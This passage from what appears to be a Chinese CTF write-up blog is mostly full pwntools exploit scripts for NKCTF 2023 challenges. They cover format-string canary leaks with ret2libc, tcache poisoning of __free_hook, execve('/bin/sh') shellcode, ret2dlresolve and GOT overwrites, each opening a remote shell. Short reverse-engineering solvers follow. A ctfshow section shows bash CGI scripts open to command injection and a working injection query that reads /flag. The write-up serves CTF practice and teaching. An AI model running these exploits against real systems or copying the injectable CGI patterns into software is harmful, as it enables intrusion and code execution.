class="hljs-string">&#x27;system&#x27;</span>]<br>            bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>            gdb.attach(p)<br>        <span class="hljs-keyword">else</span>:<br>            libc=LibcSearcher(func,d)<br>            system=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>            bin_sh=libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><br>        payload=p64(ret)*<span class="hljs-number">0x1a</span>+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>        payload+=p64(ret)<br>        payload+=p64(canary)<br><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br><br>        p.interactive()<br>    <span class="hljs-keyword">except</span>:<br><br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        p.close()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>

<h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.32.so&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content: &#x27;</span>,data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;32973&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x88</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    free(i)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x48</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>show(<span class="hljs-number">7</span>)<br><br>pause()<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&amp;<span class="hljs-number">0xffffffffffffff00</span><br>main_area=d-<span class="hljs-number">0x60</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=main_area-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">6</span>-i,<span class="hljs-number">0x88</span>)<br>show(<span class="hljs-number">1</span>)<br><br>heap_1_c=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap=calc_fd(heap_1_c,<span class="hljs-number">0x2a0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>pause()<br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x91</span>)+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,pad)<br>edit(<span class="hljs-number">2</span>,pad)<br>edit(<span class="hljs-number">3</span>,pad)<br><br>pad1=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">b&#x27;\xf1&#x27;</span><br>edit(<span class="hljs-number">0</span>,pad1)<br>free(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xe8</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x88</span>+p64(<span class="hljs-number">0x91</span>)+p64(enc_fd(heap+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x90</span>+<span class="hljs-number">0x10</span>,free_hook))+<span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>,payload)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00\n&#x27;</span>)<br><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x88</span>)<br>edit(<span class="hljs-number">3</span>,p64(system)+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="9961code"><a href="#9961code" class="headerlink" title="9961code"></a>9961code</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>sh=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,r15</span><br><span class="hljs-string">and esi,edi</span><br><span class="hljs-string">mov dx,0xf</span><br><span class="hljs-string">add eax,0x30</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov esi,edi</span><br><span class="hljs-string">xor edi,edi</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh1=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">add edx,0x30</span><br><span class="hljs-string">mov ax,0</span><br><span class="hljs-string">jmp rsi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>sh2=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    mov edi,0x9961020</span><br><span class="hljs-string">    xor rsi,rsi</span><br><span class="hljs-string">    xor rdx,rdx</span><br><span class="hljs-string">    mov ax,0x3b</span><br><span class="hljs-string">    syscall&quot;&quot;&quot;</span><br><br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(sh)))<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:32041&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp main+294&#x27;)</span><br><span class="hljs-comment">#p=remote(&quot;node2.yuzhian.com.cn:30693&quot;)</span><br>pause()<br>p.sendafter(<span class="hljs-string">&#x27;shellcode&#x27;</span>,asm(sh))<br>pause()<br>p.sendline(asm(sh1))<br>pause()<br>p.sendline(asm(sh2).ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>


<h2 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>read=<span class="hljs-number">0x4013d0</span><br>leave=<span class="hljs-number">0x4013e7</span><br>ret=<span class="hljs-number">0x4013e8</span><br><span class="hljs-keyword">from</span> mcrypt <span class="hljs-keyword">import</span> *<br><br><br>c=[<span class="hljs-string">b&quot;Welcome to NKCTF!\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;tell you a secret:\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9\x00&quot;</span>,\<br>        <span class="hljs-string">b&quot;can you find me?\x00&quot;</span>]<br><br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:31146&quot;</span>)<br>base=b64()<br>base.setbase(<span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-built_in">print</span>(i)<br>    p.sendline(base.encode(i))<br>    pause()<br><br>rel=<span class="hljs-number">0x4005d8</span><br><span class="hljs-comment">#str_t=0x3ff388</span><br><span class="hljs-comment">#sym=0x3ff420</span><br>sym=<span class="hljs-number">0x4003d0</span><br>str_t=<span class="hljs-number">0x4004c0</span><br>bss=<span class="hljs-number">0x404900</span>+<span class="hljs-number">0xc0</span>*<span class="hljs-number">8</span>+<span class="hljs-number">0x40</span>+<span class="hljs-number">0x20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br>sym_ind=<span class="hljs-number">905</span><br>func_got=e.got[<span class="hljs-string">&#x27;memset&#x27;</span>]<br><br>rdi=<span class="hljs-number">0x00401683</span><br>rel_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span>+<span class="hljs-number">0x18</span><br>sym_add=bss+<span class="hljs-number">6</span>*<span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add))<br><br>gogo=<span class="hljs-number">0x401039</span><br><span class="hljs-comment">#p.interactive()</span><br><br>pad=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span><br>pad_n=<span class="hljs-number">3</span><br>bin_sh=bss<br>system=bss+<span class="hljs-number">0x28</span><br>str_=<span class="hljs-string">b&#x27;/bin/sh\x00\x00system\x00&#x27;</span><br>sym_=p32(system-str_t)+p64(<span class="hljs-number">12</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>rel_=p64(bss-<span class="hljs-number">0x30</span>)+p32(<span class="hljs-number">7</span>)+p32((sym_add-sym)//<span class="hljs-number">0x18</span>)+p32(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401039&#x27;)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rel_add-rel))<br><br><br><br>payload2=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>payload2+=<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>+p64(rdi)+p64(bin_sh)+p64(gogo)+p64((rel_add-rel)//<span class="hljs-number">0x18</span>+<span class="hljs-number">1</span>)<br>payload2+=<span class="hljs-string">b&quot;system\x00\x00&quot;</span><br>payload2+=sym_+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+rel_<br><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p64(bss)+p64(read)<br>p.sendline(payload)<br>pause()<br><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">&quot; &quot;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><br><br>e=ELF(<span class="hljs-string">&#x27;./nk_note&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:30946&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./nk_note&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>show(<span class="hljs-number">16</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>pause()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x300</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x20</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">16</span>,payload)<br>show(<span class="hljs-number">16</span>)<br>p.readuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>d1=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d1))<br>e.address=d1-<span class="hljs-number">0x4120</span><br><br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br><br><br>l=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x6B</span>):<br>    payload=<span class="hljs-string">&#x27;a&#x27;</span>*i*<span class="hljs-number">8</span><br>    edit(<span class="hljs-number">16</span>,payload)<br>    show(<span class="hljs-number">16</span>)<br>    data=p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).strip(<span class="hljs-string">b&#x27;a&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    dn=u64(data)<br>    l.append(dn)<br><br><span class="hljs-built_in">print</span>(l)<br>pause()<br>payload=flat(l)+p64(e.address+<span class="hljs-number">0x4150</span>)<br>edit(<span class="hljs-number">16</span>,payload)<br>ind=<span class="hljs-number">0x26</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.address))<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x40</span>)<br><br>edit(<span class="hljs-number">5</span>,p64(func_got))<br>show(ind)<br>dd=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(dd))<br>libc.address=dd-libc.sym[func]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">5</span>,p64(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(ind,p64(system))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>


<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ez-baby-apk"><a href="#ez-baby-apk" class="headerlink" title="ez_baby_apk"></a>ez_baby_apk</h2><p>ä½¿ç”¨jadxåŠ é›·ç”µæ¨¡æ‹Ÿå™¨è¿›è¡Œè°ƒè¯•</p>
<p><img src="/img/wp/2023/2023nkctf-45.png"></p>
<p><img src="/img/wp/2023/2023nkctf-46.png"></p>
<p><img src="/img/wp/2023/2023nkctf-47.png"></p>
<h2 id="PMKF"><a href="#PMKF" class="headerlink" title="PMKF"></a>PMKF</h2><p><img src="/img/wp/2023/2023nkctf-48.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=[<span class="hljs-string">&quot;1122&quot;</span>,<span class="hljs-string">&quot;3322&quot;</span>,<span class="hljs-string">&quot;1223&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;1101&quot;</span>,<span class="hljs-string">&quot;0000&quot;</span>,<span class="hljs-string">&quot;0101&quot;</span>,<span class="hljs-string">&quot;1211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;2223&quot;</span>,<span class="hljs-string">&quot;2330&quot;</span>,<span class="hljs-string">&quot;3323&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;1112&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>]<br>e=[]<br>k=<span class="hljs-string">b&#x27;nkman&#x27;</span><br>k1=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> k:<br>    k1+=i<br>k1=k1&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(k1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    c=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>        c+=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>)<br>    e.append(<span class="hljs-built_in">int</span>(c,<span class="hljs-number">2</span>)^k1)<br><span class="hljs-built_in">print</span>((<span class="hljs-string">b&#x27;\x05&#x27;</span>+<span class="hljs-string">b&#x27;nkman&#x27;</span>+<span class="hljs-built_in">bytes</span>(e)).<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure>

<h2 id="babyrust"><a href="#babyrust" class="headerlink" title="babyrust"></a>babyrust</h2><p><img src="/img/wp/2023/2023nkctf-49.jpg"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">b&quot;)&amp;n_qFb&#x27;NZXpj)*bLDmLnVj]@^_H&quot;</span><br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    d=(i-<span class="hljs-number">0x28</span>+<span class="hljs-number">45</span>)^<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">if</span> d&lt;<span class="hljs-number">0x20</span>:<br>        d=d+<span class="hljs-number">48</span><br>    e.append(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(e))<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2023</tag>
        <tag>nkctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€ctfshowã€‘webå…¥é—¨-åµŒå…¥å¼</title>
    <url>/posts/dc70584a/</url>
    <content><![CDATA[<p>ç¯å¢ƒæ¨¡æ‹Ÿæ­å»ºï¼š<a href="https://me.jinchuang.org/archives/114.html">Nginxæ”¯æŒwebç•Œé¢æ‰§è¡Œbash|pythonç­‰ç³»ç»Ÿå‘½ä»¤å’Œè„šæœ¬</a></p>
<h1 id="web461"><a href="#web461" class="headerlink" title="web461"></a>web461</h1><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>  OIFS=<span class="hljs-string">&quot;<span class="hljs-variable">$IFS</span>&quot;</span><br>  IFS=<span class="hljs-string">&quot;,&quot;</span><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$QUERY_STRING</span><br>  Args=(<span class="hljs-variable">$QUERY_STRING</span>)<br>  IFS=<span class="hljs-string">&quot;<span class="hljs-variable">$OIFS</span>&quot;</span><br>  <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;Args[2]&#125;</span>&quot;</span>ctf = <span class="hljs-string">&quot;admin&quot;</span>ctf ]; <span class="hljs-keyword">then</span><br>          <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;`<span class="hljs-variable">$&#123;Args[0]&#125;</span>$IFS<span class="hljs-variable">$&#123;Args[1]&#125;</span>`&quot;</span><br>  <span class="hljs-keyword">fi</span><br><span class="hljs-built_in">exit</span> 0<br></code></pre></td></tr></table></figure>

<p>ä»¥é€—å·åˆ†å‰²å€¼ï¼Œç¬¬ä¸‰ä¸ªå€¼ç­‰äºadminå³å¯rce</p>
<p><code>?cat,/flag,admin</code></p>
<h1 id="web462"><a href="#web462" class="headerlink" title="web462"></a>web462</h1><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br> OIFS=<span class="hljs-string">&quot;<span class="hljs-variable">$IFS</span>&quot;</span><br>  IFS=<span class="hljs-string">&quot;,&quot;</span><br>  <span class="hljs-built_in">set</span> <span class="hljs-variable">$QUERY_STRING</span><br>  Args=(<span class="hljs-variable">$QUERY_STRING</span>)<br>  IFS=<span class="hljs-string">&quot;<span class="hljs-variable">$OIFS</span>&quot;</span><br>  <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;Args[0]&#125;</span>&quot;</span>ctf = <span class="hljs-string">&quot;ping&quot;</span>ctf ]; <span class="hljs-keyword">then</span><br>          addr=<span class="hljs-string">&quot;`echo <span class="hljs-variable">$&#123;Args[1]&#125;</span> | sed &#x27;s|[\]||g&#x27; | sed &#x27;s|%20| |g&#x27;`&quot;</span><br>          addr=<span class="hljs-string">&quot;ping -c 1 &quot;</span><span class="hljs-variable">$addr</span><br>          <span class="hljs-variable">$addr</span><br>  <span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure>

<p>ä¸ä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œå¤šäº†ä¸¤ä¸ªè¿‡æ»¤</p>
<p>ä¸è¿‡æµ‹è¯•åå‘ç°ä¸å‡ºç½‘ã€‚ã€‚åšä¸å‡ºæ¥</p>
<p><a href="https://www.reddit.com/r/securityCTF/comments/15stmxp/a_problem_about_linux_bashcgi_command_injection/?rdt=42831">https://www.reddit.com/r/securityCTF/comments/15stmxp/a_problem_about_linux_bashcgi_command_injection/?rdt=42831</a></p>
<h1 id="web463"><a href="#web463" class="headerlink" title="web463"></a>web463</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;fcgi_stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><br><br><span class="hljs-comment">/* just get lastest info */</span><br><span class="hljs-type">int</span> _System(<span class="hljs-type">const</span> <span class="hljs-type">char</span> * cmd, <span class="hljs-type">char</span> *pRetMsg, <span class="hljs-type">int</span> msg_len)<br>&#123;<br>	FILE * fp;<br>	<span class="hljs-type">char</span> * p = <span class="hljs-literal">NULL</span>;<br>	<span class="hljs-type">int</span> res = <span class="hljs-number">-1</span>;<br>	<span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">NULL</span> || pRetMsg == <span class="hljs-literal">NULL</span> || msg_len &lt; <span class="hljs-number">0</span>)<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Param Error!\n&quot;</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span> ((fp = <span class="hljs-built_in">popen</span>(cmd, <span class="hljs-string">&quot;r&quot;</span>) ) == <span class="hljs-literal">NULL</span>)<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span 